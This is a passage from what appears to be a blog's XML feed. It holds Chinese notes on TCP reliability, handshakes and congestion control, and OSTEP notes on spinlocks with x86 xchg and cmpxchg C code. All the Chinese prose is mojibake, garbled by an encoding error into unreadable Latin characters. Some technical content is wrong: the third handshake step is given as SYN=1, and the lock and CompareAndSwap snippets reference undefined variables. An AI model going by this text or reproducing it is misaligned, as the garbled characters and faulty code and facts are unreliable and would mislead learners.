</li><li>æ¥æ”¶æ–¹ç¼“å­˜å¤šä¸ªå·²æ¥æ”¶çš„åˆ†ç»„ï¼šä¸Šå±‚ç”¨æˆ·å–ç”¨æ•°æ®çš„é€Ÿç‡ â‰  æ¥æ”¶åˆ°çš„æ•°æ®é€Ÿç‡ï¼›æ¥æ”¶åˆ°çš„æ•°æ®å¯èƒ½ä¹±åºï¼Œæ’åºäº¤ä»˜ï¼ˆå¯é ï¼‰</li></ul><p>ä¸¤ç§é€šç”¨çš„æµæ°´çº¿åè®®ï¼šå›é€€Næ­¥(Go-Back-Nï¼ŒGBN)å’Œé€‰æ‹©é‡ä¼ (Selective Repeatï¼ŒSR)</p><h3 id="æ»‘åŠ¨çª—å£"><a href="#æ»‘åŠ¨çª—å£" class="headerlink" title="æ»‘åŠ¨çª—å£"></a>æ»‘åŠ¨çª—å£</h3><p>å‘é€çª—å£ï¼šå‘é€ç¼“å†²åŒºå†…å®¹çš„ä¸€ä¸ªèŒƒå›´</p><p>æ¥æ”¶çª—å£ï¼šæ§åˆ¶å“ªäº›åˆ†ç»„å¯ä»¥æ¥æ”¶ã€‚ æ¥æ”¶çª—å£ &#x3D; æ¥æ”¶ç¼“å†²åŒº</p><h3 id="å›é€€Næ­¥-Go-Back-Nï¼ŒGBN"><a href="#å›é€€Næ­¥-Go-Back-Nï¼ŒGBN" class="headerlink" title="å›é€€Næ­¥(Go-Back-Nï¼ŒGBN)"></a>å›é€€Næ­¥(Go-Back-Nï¼ŒGBN)</h3><ul><li>å‘é€çª—å£å°ºå¯¸ &gt; 1</li><li>æ¥æ”¶çª—å£å°ºå¯¸ &#x3D; 1</li></ul><p>å‘é€ç¼“å­˜</p><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230906195343476.png" alt="image-20230906195343476"></p><p><strong>å‘é€æ–¹ï¼š</strong></p><ul><li>å‘é€çª—å£æœªæ»¡æ—¶ï¼Œäº§ç”Ÿä¸€ä¸ªåˆ†ç»„å¹¶å°†å…¶å‘é€ï¼Œå¹¶æŠŠnextseqnum++ï¼›</li><li>çª—å£å·²æ»¡ï¼Œå‘é€æ–¹åªéœ€å°†æ•°æ®è¿”å›ç»™ä¸Šå±‚ï¼Œéšå¼åœ°æŒ‡ç¤ºä¸Šå±‚è¯¥çª—å£å·²æ»¡ï¼Œæˆ–è€…å…ˆç¼“å­˜ä¸‹æ¥ä»¥åå‘é€</li><li>åªæœ‰æœ€æ—©çš„<strong>å·²å‘é€ä½†æœªè¢«ç¡®è®¤çš„åˆ†ç»„</strong>æ‹¥æœ‰çš„å®šæ—¶å™¨</li><li>æ¥æ”¶åˆ°ackåbase++ï¼›å¦‚æœæ­¤æ—¶base&#x3D;&#x3D;nextseqnumåˆ™åœæ­¢å®šæ—¶å™¨ï¼Œå¦åˆ™è¯´æ˜è¿˜æœ‰å·²å‘é€ä½†æœªè¢«ç¡®è®¤çš„åˆ†ç»„ï¼Œåˆ™é‡æ–°å¼€å§‹è®¡æ•°å™¨</li><li>å®šæ—¶å™¨è¶…æ—¶åˆ™é‡æ–°å‘é€base~nextseqnumçš„æ‰€æœ‰åˆ†ç»„</li></ul><p><strong>æ¥æ”¶æ–¹ï¼š</strong></p><ul><li><p>æ¥æ”¶çª—å£çš„å°ºå¯¸ä¸º1ï¼Œåªèƒ½é¡ºåºæ¥æ”¶ï¼Œæ¥æ”¶åç›´æ¥äº¤ä»˜ä¸Šæ–¹</p><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230906214049306.png" alt="image-20230906214049306"></p><p>æ¯”å¦‚ç°åœ¨åªæœ‰0å¯ä»¥æ¥æ”¶ï¼Œå…¶ä»–åˆ†ç»„åˆ°è¾¾ä¼šè¢«ä¸¢å¼ƒï¼Œæ¥æ”¶åçª—å£æ»‘åŠ¨åˆ°1ï¼Œå‘å‘é€æ–¹å‘é€ackï¼Œç„¶åç­‰å¾…æ¥æ”¶</p></li></ul><h3 id="é€‰æ‹©é‡ä¼ -Selective-Repeatï¼ŒSR"><a href="#é€‰æ‹©é‡ä¼ -Selective-Repeatï¼ŒSR" class="headerlink" title="é€‰æ‹©é‡ä¼ (Selective Repeatï¼ŒSR)"></a>é€‰æ‹©é‡ä¼ (Selective Repeatï¼ŒSR)</h3><ul><li>å‘é€çª—å£å°ºå¯¸ &gt; 1</li><li>æ¥æ”¶çª—å£å°ºå¯¸ &gt; 1</li></ul><p>å‘é€ç¼“å­˜</p><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230906225824770.png" alt="image-20230906225824770"></p><p><strong>å‘é€æ–¹ï¼š</strong></p><ul><li>å‘é€çª—å£æœªæ»¡æ—¶ï¼Œäº§ç”Ÿä¸€ä¸ªåˆ†ç»„å¹¶å°†å…¶å‘é€ï¼Œå¹¶æŠŠnextseqnum++ï¼›</li><li>çª—å£å·²æ»¡ï¼Œå‘é€æ–¹åªéœ€å°†æ•°æ®è¿”å›ç»™ä¸Šå±‚ï¼Œéšå¼åœ°æŒ‡ç¤ºä¸Šå±‚è¯¥çª—å£å·²æ»¡ï¼Œæˆ–è€…å…ˆç¼“å­˜ä¸‹æ¥ä»¥åå‘é€</li><li><strong>æ‰€æœ‰å·²å‘é€ä½†æœªè¢«ç¡®è®¤çš„åˆ†ç»„</strong>æ‹¥æœ‰çš„å®šæ—¶å™¨</li><li>åªå‘é€å®šæ—¶å™¨è¶…æ—¶çš„åˆ†ç»„</li></ul><p><strong>æ¥æ”¶æ–¹ï¼š</strong></p><ul><li>æ¥æ”¶çª—å£çš„å°ºå¯¸ &gt; 1ï¼Œå¯ä»¥ä¹±åºæ¥æ”¶</li><li>ä½åºå·çš„åˆ†ç»„åˆ°æ¥ï¼Œæ¥æ”¶çª—å£ç§»åŠ¨</li><li>é«˜åºå·åˆ†ç»„ä¹±åºåˆ°ï¼Œç¼“å­˜ä½†ä¸äº¤ä»˜ï¼ˆå› ä¸ºè¦å®ç°Reliable Data Transferï¼Œä¸å…è®¸å¤±åºï¼‰ï¼Œä¸æ»‘åŠ¨ï¼Œåˆ†ç»„éƒ½æ”¶åˆ°åæœ€åä¸€èµ·äº¤ä»˜ç»™ä¸Šæ–¹</li></ul><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230906214815621.png" alt="image-20230906214815621"></p><ul><li><p>æ¥æ”¶åˆ°åˆ†ç»„åå‘é€ACKn(ack+åºå·)ï¼Œç”±äºè¿™ä¸ªackå¯èƒ½ä¸¢å¤±ï¼Œæ‰€ä»¥ä¸ç®¡æ¥æ”¶æ–¹æ¥æ”¶åˆ°ä»€ä¹ˆåˆ†ç»„ï¼Œå³ä½¿æ˜¯å½“å‰çª—å£å¾ˆæ—©ä¹‹å‰çš„åˆ†ç»„ï¼Œä¹Ÿåº”è¯¥å‘é€ACKn,ä¸ç„¶ä¼šå¯¼è‡´å‘é€æ–¹çª—å£ä¸æ»‘åŠ¨</p><blockquote><p>å¯¹SRåè®®è€Œè¨€ï¼Œè¿™å°±æ„å‘³ç€å‘é€æ–¹å’Œæ¥æ”¶æ–¹çš„çª—å£ å¹¶ä¸æ€»æ˜¯ä¸€è‡´ ã€‚</p></blockquote></li></ul><p><strong>çª—å£çš„æœ€å¤§å°ºå¯¸</strong></p><p>GBN: 2<sup>n</sup>-1</p><p>SR:2<sup>n-1</sup></p><p>å…·ä½“åŸå› å¯ä»¥çœ‹</p><ul><li><a href="https://zhuanlan.zhihu.com/p/450499911">https://zhuanlan.zhihu.com/p/450499911</a></li><li><a href="https://www.cnblogs.com/zqybegin/p/13810647.html">https://www.cnblogs.com/zqybegin/p/13810647.html</a></li></ul><p>å‡æ˜¯ä¸ºäº†è¶…æ—¶é‡ä¼ æ¥å—æ–¹èƒ½å¤ŸåŒºåˆ†åˆ°åº•æ˜¯æ–°æ•°æ®è¿˜æ˜¯è€æ•°æ®ã€‚</p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230907131528781.png" alt="image-20230907131528781"></p><p><strong>åºå·</strong>ï¼šå‘é€æŠ¥æ–‡æ®µæ•°æ®é¦–å­—èŠ‚åœ¨åº”ç”¨å±‚äº¤ä¸‹æ¥å­—èŠ‚æµçš„åç§»é‡+å­—èŠ‚æµåˆå§‹åºå·(åˆå§‹åºå·åœ¨å»ºç«‹è¿æ¥æ—¶ç¡®å®šï¼Œä¸€èˆ¬éšæœºåœ°é€‰æ‹©åˆå§‹åºå·)</p><p><strong>ç¡®è®¤åºå·</strong>(Acknowledge number)ï¼šæœŸæœ›ä»å¦ä¸€æ–¹æ”¶åˆ°çš„ä¸‹ä¸€ä¸ªå­—èŠ‚çš„åºå·</p><p><strong>é¦–éƒ¨é•¿åº¦</strong>ï¼šTCPé€‰é¡¹å­—æ®µæ˜¯é•¿åº¦æ˜¯å¯å˜çš„ï¼Œå¯¼è‡´æŠ¥æ–‡æ®µé•¿åº¦å¯å˜ï¼Œ4bité¦–éƒ¨é•¿åº¦ç”¨æ¥è¡¨ç¤º32bitçš„å­—ä¸ºå•ä½çš„TCPé¦–éƒ¨é•¿åº¦</p><p><strong>è¡¨ç¤ºå­—æ®µ</strong>ï¼š</p><ul><li>URGï¼šç´§æ€¥æŒ‡é’ˆæ ‡å¿—ï¼Œä¸º1æ—¶è¡¨ç¤ºç´§æ€¥æŒ‡é’ˆæœ‰æ•ˆï¼Œè¯¥æŠ¥æ–‡åº”è¯¥ä¼˜å…ˆä¼ é€</li><li>ACKï¼šACK &#x3D; 1æŠ¥æ–‡æ®µä¸ºç¡®è®¤æŠ¥æ–‡æ®µï¼Œä¸º0è¡¨ç¤ºæ•°æ®æ®µä¸åŒ…å«ç¡®è®¤ä¿¡æ¯ï¼Œç¡®è®¤å·è¢«å¿½ç•¥</li><li>PSH &#x3D; 1 è¡¨ç¤ºè¯¥æŠ¥æ–‡æ®µé«˜ä¼˜å…ˆçº§ï¼Œæ¥æ”¶æ–¹TCPåº”å°½å¿«æ¨é€ç»™æ¥æ”¶åº”ç”¨ç¨‹åº</li><li>RST &#x3D; 1ï¼Œè¡¨ç¤º TCP è¿æ¥ä¸­å‡ºç°ä¸¥é‡é”™è¯¯ï¼Œéœ€è¦é‡Šæ”¾å¹¶é‡æ–°å»ºç«‹è¿æ¥ï¼Œç§°ä¸ºå¤ä½æŠ¥æ–‡æ®µ</li><li>SYN &#x3D; 1ï¼Œè¡¨æ˜è¿™æ˜¯ä¸€ä¸ªè¯·æ±‚è¿æ¥æŠ¥æ–‡æ®µï¼Œç§°ä¸ºåŒæ­¥æŠ¥æ–‡æ®µ</li><li>FIN &#x3D; 1ï¼Œè¡¨ç¤ºæ­¤æŠ¥æ–‡æ®µçš„å‘é€æ–¹çš„æ•°æ®å·²ç»å‘é€å®Œæ¯•ï¼Œå¹¶è¦æ±‚é‡Šæ”¾ TCP è¿æ¥ï¼Œç§°ä¸ºç»“æŸæŠ¥æ–‡æ®µ</li></ul><p><strong>æ¥æ”¶çª—å£</strong>ï¼šçª—å£å¤§å°çš„å€¼æ˜¯æŒ‡ï¼Œä»æœ¬æŠ¥æ–‡æ®µé¦–éƒ¨ä¸­çš„ç¡®è®¤å·ç®—èµ·ï¼Œæ¥æ”¶æ–¹ç›®å‰å…è®¸å¯¹æ–¹å‘é€çš„æ•°æ®é‡ã€‚ç”¨äºæµé‡æ§åˆ¶</p><p>ä»¥å¤ªç½‘å’ŒPPPé“¾è·¯å±‚åè®®éƒ½å…·æœ‰1500å­—èŠ‚çš„MTU(Maximum Transmission Unit, MTU)ï¼Œå»é™¤20å­—èŠ‚ipå¤´ï¼Œ20å­—èŠ‚TCPå¤´ï¼Œæœ€å¤§æŠ¥æ–‡æ®µé•¿åº¦(Maximum Segment Size,<br>MSS)ä¸€èˆ¬ä¸º1460</p><h3 id="å¯é æ•°æ®ä¼ è¾“"><a href="#å¯é æ•°æ®ä¼ è¾“" class="headerlink" title="å¯é æ•°æ®ä¼ è¾“"></a>å¯é æ•°æ®ä¼ è¾“</h3><p>TCPé‡‡ç”¨äº†ç±»ä¼¼äºGBNçš„å•ä¸€è®¡æ—¶å™¨ï¼Œåªä¸ºæœ€æ—©å‘é€ä½†æœªç¡®è®¤çš„æŠ¥æ–‡æ®µè®¾ç½®è®¡æ—¶å™¨ï¼Œä¸”å®šæ—¶å™¨è¿‡æœŸåªå‘é€è¿™ä¸€ä¸ªæŠ¥æ–‡æ®µ</p><p>æ¯”å¦‚å‘é€æ–¹å‘é€äº†ï¼Œæ•°æ®æµä¸­0~1460çš„AæŠ¥æ–‡æ®µï¼Œ1461~2921çš„BæŠ¥æ–‡æ®µ,2922~4382çš„CæŠ¥æ–‡æ®µï¼Œåç»­æŠ¥æ–‡æ®µDï¼ŒEï¼ŒFï¼ŒGï¼Œå‘é€æ–¹åªä¸º0~1460çš„AæŠ¥æ–‡æ®µè®¾ç½®è®¡æ—¶å™¨</p><p>æ¥æ”¶æ–¹æ¥æ”¶åˆ°AæŠ¥æ–‡ï¼ŒBæŠ¥æ–‡æ®µä¸¢å¤±ï¼Œæ¥æ”¶åˆ°CæŠ¥æ–‡æ®µï¼Œå¯¹äºä¹±åºçš„æ¥æ”¶TCPç¨‹åºå‘˜å¯è‡ªè¡Œå¤„ç†ï¼Œä¸¢å¼ƒæˆ–è€…ç¼“å­˜ï¼Œå¯¹äºæ”¶åˆ°C D E F Géƒ½ä¼šå‘å‘é€æ–¹å‘é€<strong>ç¡®è®¤åºå·</strong>ä¸ºBçš„ACKï¼Œå‘é€æ–¹æ¥æ”¶åˆ°ä¸‰ä¸ªç›¸åŒå†—ä½™çš„ACKåˆ™ç«‹å³é‡ä¼ Båˆ†ç»„ï¼Œä¸ç”¨ç­‰è®¡æ—¶å™¨è¿‡æœŸï¼Œè¿™ç§æ“ä½œå«<strong>å¿«é€Ÿé‡ä¼ </strong></p><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230907215922072.png" alt="image-20230907215922072"></p><h3 id="TCP-3æ¬¡æ¡æ‰‹"><a href="#TCP-3æ¬¡æ¡æ‰‹" class="headerlink" title="TCP 3æ¬¡æ¡æ‰‹"></a>TCP 3æ¬¡æ¡æ‰‹</h3><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230907220150943.png" alt="image-20230907220150943"></p><ol><li>å®¢æˆ·ç«¯å‘é€SYN&#x3D;1ï¼Œä¸åŒ…å«åº”ç”¨å±‚æ•°æ®çš„tcpæŠ¥æ–‡æ®µï¼Œéšæœºé€‰æ‹©åˆå§‹åºå·seq&#x3D;Jï¼Œç§°ä¸ºåŒæ­¥æŠ¥æ–‡æ®µæˆ–SYN æŠ¥æ–‡æ®µ</li><li>æœåŠ¡å™¨æ”¶åˆ°SYNæŠ¥æ–‡æ®µï¼ŒæœåŠ¡å™¨åˆ†é…TCPç¼“å­˜å’Œå˜é‡ï¼Œå‘é€SYN&#x3D;1ï¼ŒACK&#x3D;1ï¼Œç¡®è®¤åºå·ack&#x3D;J+1ï¼Œéšæœºé€‰æ‹©åˆå§‹åºå·seq&#x3D;Kçš„å…è®¸è¿æ¥æŠ¥æ–‡ï¼Œç§°ä¸ºSYNACKæŠ¥æ–‡æ®µ</li><li>å®¢æˆ·ç«¯æ”¶åˆ° SYNACK æŠ¥æ–‡æ®µåï¼Œå®¢æˆ·ç«¯åˆ†é…TCPç¼“å­˜å’Œå˜é‡ï¼Œå‘é€SYN&#x3D;1 ACK&#x3D;1ï¼Œç¡®è®¤åºå·ack&#x3D;K+1çš„æŠ¥æ–‡ç¡®è®¤è¿æ¥ï¼Œä¸€èˆ¬è¿˜ä¼šåœ¨æ­¤æŠ¥æ–‡æ®µæºå¸¦æ•°æ®</li></ol><h3 id="TCP-å››æ¬¡æŒ¥æ‰‹"><a href="#TCP-å››æ¬¡æŒ¥æ‰‹" class="headerlink" title="TCP å››æ¬¡æŒ¥æ‰‹"></a><a href="https://juejin.cn/post/7063829623024386056">TCP å››æ¬¡æŒ¥æ‰‹</a></h3><p><img src="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/image-20230908002803834.png" alt="image-20230908002803834"></p><ol><li>å®¢æˆ·ç«¯å‘é€FIN&#x3D;1ï¼Œseq&#x3D;uçš„ç»“æŸæŠ¥æ–‡æ®µï¼ŒFIN-WAIT-1 é˜¶æ®µï¼ŒTCPåŠå…³é—­é˜¶æ®µ</li><li>æœåŠ¡å™¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚æ–­å¼€è¿æ¥çš„ FIN æŠ¥æ–‡åï¼Œç»“æŸ ESTABLISHED é˜¶æ®µï¼Œè¿›å…¥ CLOSE-WAIT é˜¶æ®µå¹¶è¿”å›ä¸€æ®µ TCP æŠ¥æ–‡ï¼ŒACK&#x3D;1ï¼ŒSeq &#x3D; vï¼Œack &#x3D; u + 1ï¼ŒTCPåŠå…³é—­é˜¶æ®µï¼Œè€ŒAæ”¶åˆ°Bçš„ç¡®è®¤åï¼Œè¿›å…¥FIN-WAIT-2çŠ¶æ€ï¼Œç­‰å¾…Bå‘å‡ºçš„è¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µ</li><li>å› ä¸ºæ–­å¼€è¿æ¥æ˜¯Aæå‡ºçš„ï¼Œå¯èƒ½Bè¿˜æœ‰æ•°æ®è¦ä¼ è¾“ï¼Œæ‰€ä»¥ä¸èƒ½å’Œä¸Šä¸€æ¬¡ACKä¸€èµ·å‘ï¼Œå½“Bæ•°æ®ä¼ è¾“å®Œæ¯•åï¼ŒBå‘å‡ºè¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µ</li><li>Aæ”¶åˆ°Bçš„è¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µåï¼Œå¯¹æ­¤å‘å‡ºç¡®è®¤æŠ¥æ–‡æ®µï¼ˆACK &#x3D; 1ï¼Œseq&#x3D;u+1ï¼Œack&#x3D;w+1ï¼‰,Aè¿›å…¥TIME-WAITï¼ˆæ—¶é—´ç­‰å¾…ï¼‰çŠ¶æ€ã€‚æ­¤æ—¶TCPæœªé‡Šæ”¾æ‰ï¼Œéœ€è¦ç»è¿‡æ—¶é—´ç­‰å¾…è®¡æ—¶å™¨è®¾ç½®çš„æ—¶é—´2MSLåï¼ŒAæ‰è¿›å…¥CLOSEçŠ¶æ€ã€‚</li></ol><blockquote><p>ä¸ºä»€ä¹ˆAåœ¨TIME-WAITçŠ¶æ€å¿…é¡»ç­‰å¾…2MSLï¼ˆæœ€å¤§æŠ¥æ–‡ç”Ÿå­˜æ—¶é—´ï¼‰çš„æ—¶é—´ï¼Ÿ</p><ul><li>ä¿è¯Aã€Bæ­£å¸¸è¿›å…¥CLOSEDçŠ¶æ€ï¼šæœ€åä¸€ä¸ªACKä¸¢å¤±å¯èƒ½ä¸¢å¤±ï¼ŒTCPæœåŠ¡å™¨è¿›ç¨‹å¯¹ä¹‹å‰æ‰€å‘é€çš„TCPè¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µçš„è¶…æ—¶é‡ä¼ ï¼Œå¦‚æœTCPå®¢æˆ·è¿›ç¨‹å±äºå…³é—­çŠ¶æ€ï¼Œä¼šå¯¼è‡´æœåŠ¡å™¨åå¤é‡ä¼ æ— æ³•å…³é—­</li><li>2MSLæ—¶é•¿ï¼Œå¯ä»¥ä½¿æœ¬æ¬¡è¿æ¥æŒç»­æ—¶é—´å†…æ‰€äº§ç”Ÿçš„æ‰€æœ‰æŠ¥æ–‡æ®µéƒ½ä»ç½‘ç»œä¸­æ¶ˆå¤±ï¼Œä¿è¯ä¸‹ä¸€ä¸ªæ–°çš„TCPè¿æ¥ä¸­ï¼Œä¸ä¼šå‡ºç°æ—§è¿æ¥ä¸­çš„æŠ¥æ–‡æ®µ</li></ul></blockquote><h2 id="TCPæ‹¥å¡æ§åˆ¶"><a href="#TCPæ‹¥å¡æ§åˆ¶" class="headerlink" title="TCPæ‹¥å¡æ§åˆ¶"></a>TCPæ‹¥å¡æ§åˆ¶</h2><p>CongWinæ‹¥å¡çª—å£ Threshold æ…¢å¯åŠ¨åŠ¨é˜™å€¼</p><ul><li>å½“ CongWin &lt; Threshold, å‘é€ç«¯å¤„äºæ…¢å¯åŠ¨é˜¶æ®µï¼ˆslow-start ï¼‰, çª—å£æŒ‡æ•°æ€§(å¹³æ–¹å¢åŠ MSS)å¢é•¿</li><li>å½“ CongWin &gt; Threshold, å‘é€ç«¯å¤„äºæ‹¥å¡é¿å…é˜¶æ®µï¼ˆ congestion-avoidance ï¼‰ , çª—å£çº¿æ€§å¢é•¿(+1 MSS)</li><li>å½“æ”¶åˆ°ä¸‰ä¸ªé‡å¤çš„ ACKs(triple duplicate ACK),Threshold è®¾ç½®æˆ CongWin&#x2F;2 ï¼ŒCongWin&#x3D;Threshold+3.</li><li>å½“è¶…æ—¶äº‹ä»¶å‘ç”Ÿæ—¶ timeout, Threshold&#x3D;CongWin&#x2F;2CongWin&#x3D;1 MSS ï¼Œè¿›å…¥ æ…¢å¯åŠ¨SS é˜¶æ®µ</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:27 é”ğŸ”’</title>
      <link href="/2023/09/03/OSTEP-28-LOCK/"/>
      <url>/2023/09/03/OSTEP-28-LOCK/</url>
      
        <content type="html"><![CDATA[<p>é”å°†åŸæœ¬ç”±æ“ä½œç³»ç»Ÿè°ƒåº¦çº¿ç¨‹çš„æ··ä¹±çŠ¶æ€å˜å¾—å¯æ§</p><h2 id="è¯„ä»·é”ğŸ”’"><a href="#è¯„ä»·é”ğŸ”’" class="headerlink" title="è¯„ä»·é”ğŸ”’"></a>è¯„ä»·é”ğŸ”’</h2><ul><li>æ­£ç¡®æ€§:èƒ½å¦é˜»æ­¢çº¿ç¨‹è¿›å…¥ä¸´ç•ŒåŒº</li><li>å…¬å¹³æ€§ï¼šæ˜¯å¦æ¯ä¸€ä¸ªç«äº‰çº¿ç¨‹æœ‰å…¬å¹³çš„æœºä¼šæŠ¢åˆ°é”</li><li>æ€§èƒ½ï¼šåŠ é”ä¹‹åå¢åŠ çš„æ—¶é—´å¼€é”€<ul><li>æ²¡æœ‰ç«äº‰ï¼Œä¸€ä¸ªçº¿ç¨‹åŠ é”å¼€é”</li><li>ä¸€ä¸ªcpuï¼Œå¤šä¸ªçº¿ç¨‹ç«äº‰</li><li>å¤šä¸ªcpuï¼Œå¤šä¸ªçº¿ç¨‹ç«äº‰</li></ul></li></ul><h2 id="æ§åˆ¶ä¸­æ–­"><a href="#æ§åˆ¶ä¸­æ–­" class="headerlink" title="æ§åˆ¶ä¸­æ–­"></a>æ§åˆ¶ä¸­æ–­</h2><p>æœ€æ—©çš„å•å¤„ç†å™¨è§£å†³æ–¹æ³•:è¿›å…¥ä¸´ç•ŒåŒºå‰å…³ä¸­æ–­</p><p>ç¼ºç‚¹</p><ul><li>éœ€è¦å…è®¸ç¨‹åºå¼€å…³ä¸­æ–­</li><li>å¤šå¤„ç†å™¨ä¸å¯è¡Œï¼Œå…¶ä»–å¤„ç†å™¨ä¸Šçº¿ç¨‹å¯ä»¥è¿›å…¥ä¸´ç•ŒåŒº</li><li>å…³ä¸­æ–­æœŸé—´å¯èƒ½å¯¼è‡´å…¶ä»–æ­£å¸¸ä¸­æ–­ä¸¢å¤±</li><li>æ•ˆç‡ä½</li></ul><h2 id="ç¡¬ä»¶æ”¯æŒ"><a href="#ç¡¬ä»¶æ”¯æŒ" class="headerlink" title="ç¡¬ä»¶æ”¯æŒ"></a>ç¡¬ä»¶æ”¯æŒ</h2><p>ä¸å…¶è½¯ä»¶ä¸Šåˆ©ç”¨:DEKKER,PETERSONç­‰ç®—æ³•ï¼Œä¸å¦‚ç¡¬ä»¶æ”¯æŒğŸ‘Œ,å¢åŠ äº†ä¸€äº›ç¡¬ä»¶åŸè¯­</p><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p><strong>xchg ï¼ˆatomic exchangeï¼ŒåŸå­äº¤æ¢ï¼‰æŒ‡ä»¤</strong>ï¼Œé€šå¸¸ç§°ä¸ºæµ‹è¯•å¹¶è®¾ç½®æŒ‡ä»¤ï¼ˆtest-and-setï¼‰</p><p><strong>è‡ªæ—‹é”spin lockå®ç°</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">xchg</span><span class="params">(<span class="keyword">volatile</span> <span class="type">int</span> *addr, <span class="type">int</span> newval)</span> &#123;</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;lock xchg %0, %1&quot;</span></span></span><br><span class="line"><span class="params">    : <span class="string">&quot;+m&quot;</span>(*addr), <span class="string">&quot;=a&quot;</span>(result) : <span class="string">&quot;1&quot;</span>(newval))</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag = YES;<span class="comment">//flagä¸ºYESä»£è¡¨å¯ä»¥è¿›ä¸´ç•ŒåŒºï¼Œ</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">()</span> &#123;</span><br><span class="line">retry:</span><br><span class="line">  <span class="type">int</span> got = xchg(&amp;flag, NOPE);</span><br><span class="line">  <span class="keyword">if</span> (got == NOPE)</span><br><span class="line">    <span class="keyword">goto</span> retry;</span><br><span class="line">  assert(got == YES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">()</span> &#123;</span><br><span class="line">  xchg(&amp;flag, YES)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œä¸Šé¢ä»£ç ç­‰ä»·çš„ç²¾ç®€</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag = <span class="number">0</span><span class="comment">//flagä¸º0ä»£è¡¨æ²¡æœ‰é”ä¸Šï¼Œå¯ä»¥è¿›ä¸´ç•ŒåŒº</span></span><br><span class="line"><span class="type">void</span> lock() &#123; <span class="keyword">while</span>(xchg(&amp;flag,<span class="number">1</span>))&#125;</span><br><span class="line"><span class="type">void</span> unlock() &#123; xchg(&amp;locked, <span class="number">0</span>); &#125;</span><br></pre></td></tr></table></figure><p><strong>cpmxhgæŒ‡ä»¤ Compare and Exchange</strong> </p><blockquote><p>x86&#x2F;64æ¶æ„ä¸­çš„cmpxchgæŒ‡ä»¤æ˜¯å¦‚ä½•å®ç°å¹¶ä¿è¯åŸå­æ€§çš„</p><p><a href="https://www.zhihu.com/question/492576993">https://www.zhihu.com/question/492576993</a></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">CompareAndSwap</span><span class="params">(<span class="type">int</span> *ptr, <span class="type">int</span> expected, <span class="type">int</span> new)</span> &#123;</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">char</span> ret;</span><br><span class="line">    <span class="comment">// Note that sete sets a &#x27;byte&#x27; not the word</span></span><br><span class="line">    __asm__ __volatile__ (</span><br><span class="line">    <span class="string">&quot; lock\n&quot;</span></span><br><span class="line">    <span class="string">&quot; cmpxchgl %2,%1\n&quot;</span></span><br><span class="line">    <span class="string">&quot; sete %0\n&quot;</span></span><br><span class="line">    : <span class="string">&quot;=q&quot;</span> (ret), <span class="string">&quot;=m&quot;</span> (*ptr)</span><br><span class="line">    : <span class="string">&quot;r&quot;</span> (new), <span class="string">&quot;m&quot;</span> (*ptr), <span class="string">&quot;a&quot;</span> (old)<span class="comment">//å¯¹äºç›¸åŒçš„&quot;m&quot; (*ptr)ä¼¼ä¹æ˜¯æŒ‰ç…§åé¢çš„æ¥ç®—çš„ï¼Œæ‰€ä»¥è¿™é‡Œ%0ä»£è¡¨retï¼Œ%1ä»£è¡¨ newï¼Œ %2ä»£è¡¨*ptr</span></span><br><span class="line">    : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>cmpxchg dest,src:å°†ALã€AXã€EAXæˆ–RAXå¯„å­˜å™¨ä¸­çš„å€¼ä¸ç¬¬ä¸€ä¸ªæ“ä½œæ•°destï¼ˆç›®æ ‡æ“ä½œæ•°ï¼‰è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœä¸¤ä¸ªå€¼ç›¸ç­‰ï¼Œåˆ™å°†ç¬¬äºŒä¸ªæ“ä½œæ•°srcï¼ˆæºæ“ä½œæ•°ï¼‰åŠ è½½åˆ°destç›®æ ‡æ“ä½œæ•°ä¸­åŒæ—¶ZFæ ‡å¿—ä½ç½®1ã€‚ 